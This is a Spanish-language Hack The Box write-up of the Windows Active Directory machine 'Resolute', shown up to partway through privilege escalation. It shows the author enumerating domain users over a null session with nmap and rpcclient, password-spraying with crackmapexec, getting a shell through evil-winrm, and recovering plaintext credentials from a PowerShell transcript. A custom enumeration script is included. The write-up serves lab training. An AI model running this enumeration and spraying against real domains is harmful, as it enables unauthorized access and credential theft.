---
title: Hack The Box Resolute
author: k4miyo
date: 2022-01-13
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Windows]
tags: [Windows, Active Directory, Powershell]
ping: true
---

## Resolute
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.169.

```bash
❯ ping -c 1 10.10.10.169
PING 10.10.10.169 (10.10.10.169) 56(84) bytes of data.
64 bytes from 10.10.10.169: icmp_seq=1 ttl=127 time=139 ms

--- 10.10.10.169 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 139.303/139.303/139.303/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.169 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-12 22:36 CST
Initiating SYN Stealth Scan at 22:36          
Scanning 10.10.10.169 [65535 ports]        
Discovered open port 445/tcp on 10.10.10.169  
Discovered open port 53/tcp on 10.10.10.169 
Discovered open port 139/tcp on 10.10.10.169 
Discovered open port 135/tcp on 10.10.10.169  
Discovered open port 5985/tcp on 10.10.10.169 
Discovered open port 49675/tcp on 10.10.10.169
Discovered open port 49666/tcp on 10.10.10.169
Discovered open port 389/tcp on 10.10.10.169
Discovered open port 3269/tcp on 10.10.10.169                                                                                    
Discovered open port 49667/tcp on 10.10.10.169
Discovered open port 49680/tcp on 10.10.10.169
Discovered open port 49665/tcp on 10.10.10.169
Discovered open port 9389/tcp on 10.10.10.169
Discovered open port 47001/tcp on 10.10.10.169
Discovered open port 88/tcp on 10.10.10.169     
Discovered open port 49674/tcp on 10.10.10.169  
Discovered open port 636/tcp on 10.10.10.169    
Discovered open port 3268/tcp on 10.10.10.169   
Discovered open port 49671/tcp on 10.10.10.169  
Discovered open port 49664/tcp on 10.10.10.169  
Discovered open port 49726/tcp on 10.10.10.169  
Discovered open port 593/tcp on 10.10.10.169    
Discovered open port 464/tcp on 10.10.10.169    
Completed SYN Stealth Scan at 22:36, 14.13s elapsed (65535 total ports)
Nmap scan report for 10.10.10.169               
Host is up, received user-set (0.14s latency).  
Scanned at 2022-01-12 22:36:36 CST for 14s      
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49680/tcp open  unknown          syn-ack ttl 127
49726/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.26 seconds
           Raw packets sent: 69039 (3.038MB) | Rcvd: 68337 (2.734MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.169
   5   │     [*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,4967
       │ 5,49680,49726
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49680,49726 1
0.10.10.169 -oN targeted   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-12 22:37 CST                                                                  
Nmap scan report for 10.10.10.169
Host is up (0.14s latency).                                                                                                      
                                                                
PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Simple DNS Plus     
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2022-01-13 04:44:48Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open   kpasswd5?                                      
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped                                     
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped                                     
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found                                                                                                          
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found                                                                                                          
49664/tcp open   msrpc        Microsoft Windows RPC
49665/tcp open   msrpc        Microsoft Windows RPC
49666/tcp open   msrpc        Microsoft Windows RPC
49667/tcp open   msrpc        Microsoft Windows RPC
49671/tcp open   msrpc        Microsoft Windows RPC
49674/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
49675/tcp open   msrpc        Microsoft Windows RPC                                                                              
49680/tcp open   msrpc        Microsoft Windows RPC
49726/tcp closed unknown 
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2022-01-12T20:45:40-08:00
|_clock-skew: mean: 2h46m56s, deviation: 4h37m08s, median: 6m55s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-01-13T04:45:42
|_  start_date: 2022-01-13T04:41:46

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.11 seconds
```

Vemos primeramente el puerto 53 abierto, asociado al servicio de DNS, por lo que podríamos tratar de encontrar algún dominio relacionado.

```bash
❯ nslookup
> server 10.10.10.169
Default server: 10.10.10.169
Address: 10.10.10.169#53
> 10.10.10.169
;; connection timed out; no servers could be reached

```
No vemos anda, así que ahora iremos por los puertos donde posiblemente tengamos una  ***Null Session***, empezando por el puerto 445.

```bash
❯ smbclient -L 10.10.10.169 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

Nos podemos logear como el usuario **Anonymous** pero no vemos nada; por lo tanto podríamos de ingresar con la herramienta `rpcclient` con una ***Null Session*** y tratar de obtener información sobre el dominio.

```bash
❯ rpcclient -U '' 10.10.10.169 -N
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Contractors] rid:[0x44f]
rpcclient $> querygroup 0x200
        Group Name:     Domain Admins
        Description:    Designated administrators of the domain
        Group Attribute:7
        Num Members:1
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      jue, 13 ene 2022 19:54:32 CST
        Logoff Time              :      mié, 31 dic 1969 18:00:00 CST
        Kickoff Time             :      mié, 31 dic 1969 18:00:00 CST
        Password last set Time   :      jue, 13 ene 2022 20:17:03 CST
        Password can change Time :      vie, 14 ene 2022 20:17:03 CST
        Password must change Time:      mié, 13 sep 30828 21:48:05 CDT
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000057
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $>

```

Vemos que podemos dumperar los usuarios del dominio y que el usuario **Administrator** es el único que se encuentra en el grupo **Domain Admins**; por lo que primero vamos a tratar de obtener los usuarios (omitiendo **Guest** y **DefaultAccount**):

```bash
❯ rpcclient -U '' 10.10.10.169 -c "enumdomusers" -N | grep -oP '\[.*?\]' | grep -v -E "0x|Guest|DefaultAccount" | tr -d '[]' | sort -u > ../content/user.txt
❯ cd ../content/
❯ cat user.txt
───────┬─────────────────────────────────────
       │ File: user.txt
───────┼─────────────────────────────────────
   1   │ abigail
   2   │ Administrator
   3   │ angela
   4   │ annette
   5   │ annika
   6   │ claire
   7   │ claude
   8   │ felicia
   9   │ fred
  10   │ gustavo
  11   │ krbtgt
  12   │ marcus
  13   │ marko
  14   │ melanie
  15   │ naoki
  16   │ paulo
  17   │ per
  18   │ ryan
  19   │ sally
  20   │ simon
  21   │ steve
  22   │ stevie
  23   │ sunita
  24   │ ulf
  25   │ zach
```

Tenomos usuarios de dominio, así que podríamos probar es validar si para estos usuarios tienen como contraseñas los mismos usuarios y esto lo lograremos con `crackmapexec smb`:

```bash
❯ crackmapexec smb 10.10.10.169 -u user.txt -p user.txt                                                                          
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.l
ocal) (signing:True) (SMBv1:True)                                                                                                
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:abigail STATUS_LOGON_FAILURE                      
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Administrator STATUS_LOGON_FAILURE                
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:angela STATUS_LOGON_FAILURE                       
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:annette STATUS_LOGON_FAILURE                      
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:annika STATUS_LOGON_FAILURE                       
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:claire STATUS_LOGON_FAILURE                       
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:claude STATUS_LOGON_FAILURE                       
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:felicia STATUS_LOGON_FAILURE                      
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:fred STATUS_LOGON_FAILURE                         
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:gustavo STATUS_LOGON_FAILURE                      
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:krbtgt STATUS_LOGON_FAILURE                       
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:marcus STATUS_LOGON_FAILURE                       
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:marko STATUS_LOGON_FAILURE                        
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:melanie STATUS_LOGON_FAILURE                      
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:naoki STATUS_LOGON_FAILURE                        
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:paulo STATUS_LOGON_FAILURE                        
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:per STATUS_LOGON_FAILURE                          
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:ryan STATUS_LOGON_FAILURE                         
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:sally STATUS_LOGON_FAILURE                        
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:simon STATUS_LOGON_FAILURE                        
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:steve STATUS_LOGON_FAILURE                        
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:stevie STATUS_LOGON_FAILURE                       
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:sunita STATUS_LOGON_FAILURE                       
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:ulf STATUS_LOGON_FAILURE                          
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:zach STATUS_LOGON_FAILURE                         
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:abigail STATUS_LOGON_FAILURE                
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:Administrator STATUS_LOGON_FAILURE          
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:angela STATUS_LOGON_FAILURE                 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:annette STATUS_LOGON_FAILURE                
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:annika STATUS_LOGON_FAILURE                 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:claire STATUS_LOGON_FAILURE                 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:claude STATUS_LOGON_FAILURE
...
```

No obtenemos ningún resultado positivo, así que podriamos tratar de listar un poco más los usuario del dominio mediante un script para ver cuales forman parte del grupo **Domain Admins**, todos los usuarios con descripción y todos los usuarios solos.

```bash
#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
    echo -e "\n${redColour}[!] ${endColour}${grayColour}Exiting...${endColour}"
    tput cnorm
    exit 0
}

ip_address=$1

if [ ! -z "$ip_address" ]; then
    tput civis
    
    domain_admins_rid=$(rpcclient -U '' $ip_address -c "enumdomgroups" -N | grep "Domain Admins" | awk 'NF{print $NF}' | grep -oP '\[.*?\]' | tr -d '[]')
    domain_admins_users=$(rpcclient -U '' $ip_address -c "querygroupmem $domain_admins_rid" -N | awk '{print $1}' | grep -oP '\[.*?\]' | tr -d '[]')
    
    echo -e "\n${purpleColour}[*] ${endColour}${yellowColour}Domain Admins: ${endColour}"
    for domain_admin_user in $domain_admins_users; do 
        echo -e "\n${grayColour}[i] ${endColour}${redColour}$domain_admin_user${endColour}\n"
	domain_user=$(rpcclient -U '' $ip_address -c "queryuser $domain_admin_user" -N | grep -E "User Name|Description" | sed 's/\t//g')
    	echo -e "${grayColour}$domain_user${endColour}"
    done

    echo -e "\n${purpleColour}[*] ${endColour}${yellowColour}Domain users with description: ${endColour}\n"
    
    declare -a users_no_description
    for user_rid in $(rpcclient -U '' 10.10.10.169 -c "enumdomusers" -N | awk 'NF{print $NF}' | grep -oP '\[.*?\]' | tr -d '[]'); do
	rpcclient -U '' 10.10.10.169 -c "queryuser $user_rid" -N > tmp_$user_rid
	user_name=$(cat tmp_$user_rid | grep "User Name" | awk 'NF{print $NF}')
	description_user=$(cat tmp_$user_rid | grep "Description" | cut -d ":" -f 2 | sed 's/\t//')

	rm tmp_$user_rid 2>/dev/null

	if [ -z "$description_user" ]; then
	    users_no_description+=($user_name)
	else
	    echo -e "${yellowColour}$user_name${endColour} : ${grayColour}$description_user${endColour}"
	fi
    done

    echo -e "\n${purpleColour}[*] ${endColour}${yellowColour}Domain users without description: ${endColour}\n"

    for user_no_description in ${users_no_description[@]}; do
	echo -ne "${blueColour}$user_no_description${endColour} "
    done; echo

    tput cnorm
else
    echo -e "\n${redColour}[!] ${endColour}${yellowColour}Usage: ${endColour}${grayColour}rpcenum <ip_address>${endColour}\n"
    exit 1
fi
```

```bash
❯ ./rpcenum 10.10.10.169

[*] Domain Admins: 

[i] 0x1f4

User Name   :Administrator
Description :Built-in account for administering the computer/domain

[*] Domain users with description: 

Administrator : Built-in account for administering the computer/domain
Guest : Built-in account for guest access to the computer/domain
krbtgt : Key Distribution Center Service Account
DefaultAccount : A user account managed by the system.
marko : Account created. Password set to Welcome123!

[*] Domain users without description: 

ryan sunita abigail marcus sally fred angela felicia gustavo ulf stevie claire paulo steve annette annika per claude melanie zach simon naoki
```

Ya contamos con una posible credencial: `marko:Welcome123!`, así que podríamos validarla con `crackmapexec smb`:

```bash
❯ crackmapexec smb 10.10.10.169 -u marko -p "Welcome123\!"
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
```

Vemos que no aplica, pero podría aplicar para otro usuario:

```bash
❯ crackmapexec smb 10.10.10.169 -u user.txt -p "Welcome123\!"
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

Contamos con una credencial válida `melanie:Welcome123!`; así que igual y podriamos acceder a la máquina con la herramienta `evil-winrm` debido a que vemos el puerto 5985 abierto:

```bash
❯ evil-winrm -u "melanie" -p "Welcome123\!" -i 10.10.10.169

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents> whoami
megabank\melanie
*Evil-WinRM* PS C:\Users\melanie\Documents>
```

Ya estamos dentro de la máquina como el usuario **melanie** y podemos visualizar la flag (usr.txt); ahora nos falta enumerar un poco el sistema para ver de que forma podemos escalar privilegios.

```bash
Evil-WinRM* PS C:\Users\melanie\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\melanie\Desktop> cd C:\
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows


*Evil-WinRM* PS C:\>
```

Como que vemos pocos recursos en la raiz del sistema; por lo que es posible que algunos se encuentren ocultos.

```bash
*Evil-WinRM* PS C:\> dir -Force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-        1/13/2022   5:53 PM      402653184 pagefile.sys


*Evil-WinRM* PS C:\>
```

Ahora si vemos más directorios y ya uno medio raro, se tiene el directorio `PSTranscripts`, así que vamos a echarle un ojo.

```bash
*Evil-WinRM* PS C:\> cd PSTranscripts
*Evil-WinRM* PS C:\PSTranscripts> dir
*Evil-WinRM* PS C:\PSTranscripts> dir -Force


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203


*Evil-WinRM* PS C:\PSTranscripts> cd 20191203
*Evil-WinRM* PS C:\PSTranscripts\20191203> dir 
*Evil-WinRM* PS C:\PSTranscripts\20191203> dir -Force


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt


*Evil-WinRM* PS C:\PSTranscripts\20191203>
```

Vemos un archivo medio curioso, así que vamos a ver su contenido.

```bash
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt                [42/42]
**********************    
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan                                         
RunAs User: MEGABANK\ryan                                                                                                        
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding 
Process ID: 2800  
PSVersion: 5.1.14393.2273                                       
PSEdition: Desktop           
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000   
WSManStackVersion: 3.0       
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************                                          
Command start time: 20191203063455
**********************                                          
PS>TerminatingError(): "System error."                                                                                           
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Na
me),'> ')                                                       
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"                                                                                   
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************                                          
Command start time: 20191203063455
**********************                                          
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>                                                                                             
**********************                                          
Command start time: 20191203063515
**********************                                          
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
                                
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"                                                                                   
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************   
Windows PowerShell transcript start
Start time: 20191203063515                                      
Username: MEGABANK\ryan      
RunAs User: MEGABANK\ryan  
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
*Evil-WinRM* PS C:\PSTranscripts\20191203> 
```

Si ponemos ojo de lince, tenemos las credenciales del usuario **ryan**: `ryan : Serv3r4Admin4cc123!`, así que podriamos pensar en contarnos a través de `evil-winrm`:

```bash
*Evil-WinRM* PS C:\PSTranscripts\20191203> net user ryan        
User name                    ryan                  
Full Name                    Ryan Bertrand
Comment                                                         
User's comment                  
Country/region code          000 (System Default)
Account active               Yes 
Account expires              Never

Password last set            1/13/2022 7:55:02 PM
Password expires             Never
Password changeable          1/14/2022 7:55:02 PM
Password required            Yes 
User may change password     Yes 

Workstations allowed         All 
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All 

Local Group Memberships
Global Group memberships     *Domain Users         *Contractors
The command completed successfully.

*Evil-WinRM* PS C:\PSTranscripts\20191203> net user melanie
User name                    melanie
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 7:55:02 PM
Password expires             Never
